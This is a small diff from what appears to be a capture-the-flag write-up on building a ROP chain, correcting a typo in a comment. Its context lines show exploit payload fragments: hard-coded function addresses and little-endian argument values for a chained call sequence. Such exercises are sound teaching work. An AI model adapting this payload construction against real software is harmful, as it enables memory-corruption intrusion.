@@ -50,7 +50,7 @@ So far we can build a piece of our ROP chain:
 call_one="\xc0\x85\x04\x08"
 call_two="\x20\x86\x04\x08"
 call_three="\xb0\x85\x04\x08"
-# arguments of the function calls (little endia format)
+# arguments of the function calls (little endian format)
 one="\x01\x00\x00\x00"
 two="\x02\x00\x00\x00"
 three="\x03\x00\x00\x00"
